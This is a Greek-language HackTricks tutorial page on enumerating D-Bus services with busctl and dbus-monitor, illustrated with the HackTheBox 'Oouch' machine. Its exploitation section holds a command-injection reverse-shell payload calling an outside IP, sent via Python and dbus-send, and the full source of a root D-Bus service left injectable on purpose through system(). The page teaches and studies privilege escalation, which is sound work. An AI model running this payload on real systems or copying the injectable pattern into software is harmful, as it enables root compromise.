# Απαρίθμηση D-Bus & Εκμετάλλευση Προνομίων Εντολών Εισαγωγής

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}

## **Απαρίθμηση GUI**

Το D-Bus χρησιμοποιείται ως μεσολαβητής επικοινωνίας μεταξύ διεργασιών (IPC) στα περιβάλλοντα εργασίας Ubuntu. Στο Ubuntu, παρατηρείται η ταυτόχρονη λειτουργία αρκετών διαύλων μηνυμάτων: ο διαύλος του συστήματος, που χρησιμοποιείται κυρίως από **υπηρεσίες με προνόμια για την εκθεση υπηρεσιών που αφορούν σε όλο το σύστημα**, και ένας διαύλος συνεδρίας για κάθε συνδεδεμένο χρήστη, που εκθέτει υπηρεσίες που αφορούν μόνο τον συγκεκριμένο χρήστη. Ο εστίαση εδώ είναι κυρίως στον διαύλο του συστήματος λόγω της συσχέτισής του με υπηρεσίες που λειτουργούν με υψηλά προνόμια (π.χ., root) καθώς ο στόχος μας είναι η ανύψωση προνομίων. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί έναν 'δρομολογητή' ανά διαύλο συνεδρίας, ο οποίος είναι υπεύθυνος για την ανακατεύθυνση των μηνυμάτων των πελατών στις κατάλληλες υπηρεσίες με βάση τη διεύθυνση που καθορίζεται από τους πελάτες για την υπηρεσία με την οποία επιθυμούν να επικοινωνήσουν.

Οι υπηρεσίες στο D-Bus ορίζονται από τα **αντικείμενα** και τις **διεπαφές** που εκθέτουν. Τα αντικείμενα μπορούν να μοιάζουν με παραδείγματα κλάσεων σε τυπικές γλώσσες ΟΟΠ, με κάθε παράδειγμα να αναγνωρίζεται μοναδικά από ένα **μονοπάτι αντικειμένου**. Αυτό το μονοπάτι, παρόμοιο με ένα μονοπάτι αρχείουσυστήματος, αναγνωρίζει μοναδικά κάθε αντικείμενο που εκθέτεται από την υπηρεσία. Μια βασική διεπαφή για ερευνητικούς σκοπούς είναι η διεπαφή **org.freedesktop.DBus.Introspectable**, που περιλαμβάνει ένα μόνο μέθοδο, το Introspect. Αυτή η μέθοδος επιστρέφει μια XML αναπαράσταση των υποστηριζόμενων μεθόδων του αντικειμένου, σημάτων και ιδιοτήτων, με εστίαση εδώ στις μεθόδους ενώ παραλείπονται οι ιδιότητες και τα σήματα.

Για την επικοινωνία με τη διεπαφή D-Bus, χρησιμοποιήθηκαν δύο εργαλεία: ένα εργαλείο γραμμής εντολών με το όνομα **gdbus** για εύκολη εκκίνηση των μεθόδων που εκθέτει το D-Bus σε σενάρια, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα εργαλείο GUI βασισμένο σε Python σχεδιασμένο για την απαρίθμηση των υπηρεσιών που είναι διαθέσιμες σε κάθε διαύλο και για την εμφάνιση των αντικειμένων που περιέχονται σε κάθε υπηρεσία.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Στην πρώτη εικόνα εμφανίζονται υπηρεσίες που έχουν καταχωρηθεί με το σύστημα διαχείρισης D-Bus, με το **org.debin.apt** να είναι ειδικά επισημασμένο μετά την επιλογή του κουμπιού Συστημικό Λεωφορείο. Το D-Feet ερωτά αυτήν την υπηρεσία για αντικείμενα, εμφανίζοντας διεπαφές, μεθόδους, ιδιότητες και σήματα για τα επιλεγμένα αντικείμενα, όπως φαίνεται στη δεύτερη εικόνα. Λεπτομερείες δίνονται επίσης για την υπογραφή κάθε μεθόδου.

Ένα χαρακτηριστικό είναι η εμφάνιση του **ID διεργασίας (pid)** και της **γραμμής εντολών**, χρήσιμα για την επιβεβαίωση εάν η υπηρεσία τρέχει με αυξημένα δικαιώματα, σημαντικό για τη σχετικότητα της έρευνας.

**Το D-Feet επίσης επιτρέπει την κλήση μεθόδων**: οι χρήστες μπορούν να εισάγουν εκφράσεις Python ως παραμέτρους, οι οποίες το D-Feet μετατρέπει σε τύπους D-Bus πριν τις περάσει στην υπηρεσία.

Ωστόσο, να σημειωθεί ότι **κάποιες μεθόδοι απαιτούν πιστοποίηση** πριν μας επιτρέψουν να τις καλέσουμε. Θα αγνοήσουμε αυτές τις μεθόδους, αφού ο στόχος μας είναι να αναβαθμίσουμε τα δικαιώματά μας χωρίς διαπιστευτήρια από την αρχή.

Επίσης, να σημειωθεί ότι μερικές από τις υπηρεσίες ερωτούν μια άλλη υπηρεσία D-Bus με το όνομα org.freedeskto.PolicyKit1 εάν ένας χρήστης πρέπει να επιτραπεί να εκτελέσει συγκεκριμένες ενέργειες ή όχι.

## **Απαρίθμηση Εντολών Cmd line**

### Λίστα Αντικειμένων Υπηρεσίας

Είναι δυνατόν να απαριθμηθούν οι ανοιχτές διεπαφές D-Bus με:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Συνδέσεις

[Από τη Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν ένας διεργασία δημιουργεί μια σύνδεση με ένα bus, το bus αναθέτει στη σύνδεση ένα ειδικό όνομα bus που ονομάζεται _μοναδικό όνομα σύνδεσης_. Τα ονόματα bus αυτού του τύπου είναι μεταβλητά - είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η σύνδεση - και, το σημαντικότερο, δεν μπορούν να επαναχρησιμοποιηθούν κατά τη διάρκεια της διάρκειας ζωής του bus. Αυτό σημαίνει ότι καμία άλλη σύνδεση σε αυτό το bus δεν θα έχει ποτέ ανατεθεί τέτοιο μοναδικό όνομα σύνδεσης, ακόμα και αν η ίδια διεργασία κλείσει τη σύνδεση με το bus και δημιουργήσει μια νέα. Τα μοναδικά ονόματα σύνδεσης είναι εύκολα αναγνωρίσιμα επειδή ξεκινούν με τον - διαφορετικά απαγορευμένο - χαρακτήρα άνω τελεία.

### Πληροφορίες Αντικειμένου Υπηρεσίας

Στη συνέχεια, μπορείτε να λάβετε κάποιες πληροφορίες σχετικά με τη διεπαφή με:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Κατάλογος Διεπαφών ενός Αντικειμένου Υπηρεσίας

Χρειάζεστε επαρκή δικαιώματα.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Εξετάστε τη διεπαφή ενός αντικειμένου υπηρεσίας

Σημειώστε πώς σε αυτό το παράδειγμα επιλέχθηκε η πιο πρόσφατη διεπαφή που ανακαλύφθηκε χρησιμοποιώντας την παράμετρο `tree` (_δείτε την προηγούμενη ενότητα_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Παρακολούθηση/Καταγραφή Διεπαφής

Με επαρκή δικαιώματα (απλά τα δικαιώματα `send_destination` και `receive_sender` δεν είναι αρκετά) μπορείτε **να παρακολουθήσετε μια επικοινωνία D-Bus**.

Για να **παρακολουθήσετε** μια **επικοινωνία** θα πρέπει να είστε **root**. Αν αντιμετωπίζετε προβλήματα με το να γίνετε root, ελέγξτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Αν γνωρίζετε πως να ρυθμίσετε ένα αρχείο ρυθμίσεων D-Bus για **επιτροπή σε μη root χρήστες να καταγράφουν** την επικοινωνία, παρακαλώ **επικοινωνήστε μαζί μου**!
{% endhint %}

Διαφορετικοί τρόποι παρακολούθησης:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Στο παρακάτω παράδειγμα το interface `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" στέλνεται μέσω παρανόησης**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Μπορείτε να χρησιμοποιήσετε το `capture` αντί για το `monitor` για να αποθηκεύσετε τα αποτελέσματα σε ένα αρχείο pcap.

#### Φιλτράρισμα όλου του θορύβου <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Αν υπάρχει υπερβολικά πολλή πληροφορία στο δίκτυο, περάστε έναν κανόνα ταιριάσματος όπως εξής:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Μπορούν να καθοριστούν πολλαπλοί κανόνες. Εάν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμμα θα εκτυπωθεί. Όπως εδώ:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Δείτε την [τεκμηρίωση του D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) για περισσότερες πληροφορίες σχετικά με τη σύνταξη των κανόνων ταιριάσματος.

### Περισσότερα

Το `busctl` έχει ακόμα περισσότερες επιλογές, [**βρείτε τις όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ευάλωτο Σενάριο**

Ως χρήστης **qtc μέσα στον υπολογιστή "oouch" από το HTB** μπορείτε να βρείτε ένα **αναπάντεχο αρχείο ρύθμισης D-Bus** που βρίσκεται στο _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Σημείωση από την προηγούμενη διαμόρφωση ότι **θα πρέπει να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της επικοινωνίας D-BUS.

Ως χρήστης **qtc** μέσα στο container docker **aeb4525789d8** μπορείτε να βρείτε κάποιον κώδικα που σχετίζεται με το dbus στο αρχείο _/code/oouch/routes.py._ Αυτός είναι ο ενδιαφέρων κώδικας:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Όπως μπορείτε να δείτε, **συνδέεται σε ένα διεπαφή D-Bus** και στέλνει στη λειτουργία **"Block"** το "client\_ip".

Απέναντι στη σύνδεση D-Bus υπάρχει ένας μεταγλωττισμένος δυαδικός κώδικας C που εκτελείται. Αυτός ο κώδικας **ακούει** στη σύνδεση D-Bus **για διευθύνσεις IP και καλεί το iptables μέσω της λειτουργίας `system`** για να μπλοκάρει τη δοθείσα διεύθυνση IP.\
**Η κλήση στην `system` είναι ευάλωτη εσκεμμένα σε εντολές εισβολής**, έτσι ένα φορτίο όπως το παρακάτω θα δημιουργήσει ένα αντίστροφο κέλυφος: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Εκμεταλλευτείτε το

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε τον **πλήρη κώδικα C της εφαρμογής D-Bus**. Μέσα σε αυτόν μπορείτε να βρείτε μεταξύ των γραμμών 91-97 **πώς ο `D-Bus object path`** και το `όνομα διεπαφής` **εγγράφονται**. Αυτές οι πληροφορίες θα είναι απαραίτητες για να στείλετε πληροφορίες στη σύνδεση D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Επίσης, στη γραμμή 57 μπορείτε να βρείτε ότι **η μοναδική μέθοδος που έχει καταχωρηθεί** για αυτή την επικοινωνία D-Bus ονομάζεται `Block` (_**Γι' αυτό στην επόμενη ενότητα τα φορτία δεδομένων θα σταλούν στο αντικείμενο υπηρεσίας `htb.oouch.Block`, τη διεπαφή `/htb/oouch/Block` και τη μέθοδο με όνομα `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Ο παρακάτω κώδικας Python θα στείλει το φορτίο στη σύνδεση D-Bus στη μέθοδο `Block` μέσω `block_iface.Block(runme)` (_σημείωση ότι εξήχθη από το προηγούμενο τμήμα κώδικα_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl και dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* Το `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για να στείλει μήνυμα στο "Message Bus".
* Message Bus - Ένα λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει τις επικοινωνίες μεταξύ εφαρμογών. Σχετίζεται με την Ουρά Μηνυμάτων (τα μηνύματα είναι ταξινομημένα σε ακολουθία), αλλά στο Message Bus τα μηνύματα στέλνονται με ένα μοντέλο συνδρομής και είναι επίσης πολύ γρήγορα.
* Η ετικέτα "-system" χρησιμοποιείται για να αναφέρει ότι πρόκειται για ένα μήνυμα συστήματος, όχι ένα μήνυμα συνεδρίας (από προεπιλογή).
* Η ετικέτα "--print-reply" χρησιμοποιείται για να εκτυπώσει το μήνυμά μας κατάλληλα και να λαμβάνει οποιεσδήποτε απαντήσεις σε μορφή ευανάγνωστη από ανθρώπους.
* Η εντολή "--dest=Dbus-Interface-Block" είναι η διεύθυνση της διεπαφής Dbus.
* Η εντολή "--string:" - Τύπος μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων όπως διπλό, bytes, booleans, int, objpath. Από αυτά, το "object path" είναι χρήσιμο όταν θέλουμε να στείλουμε τη διαδρομή ενός αρχείου στη διεπαφή Dbus. Μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) σε αυτήν την περίπτωση για να περάσουμε ένα εντολή στη διεπαφή με το όνομα ενός αρχείου. "string:;" - Αυτό είναι για να καλέσουμε ξανά τη διαδρομή του αντικειμένου όπου τοποθετούμε το αρχείο αντιστροφής κέλυφους FIFO. 

_Σημειώστε ότι στο `htb.oouch.Block.Block`, ο πρώτος μέρος (`htb.oouch.Block`) αναφέρεται στο αντικείμενο υπηρεσίας και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._

### Κώδικας C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Αναφορές
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
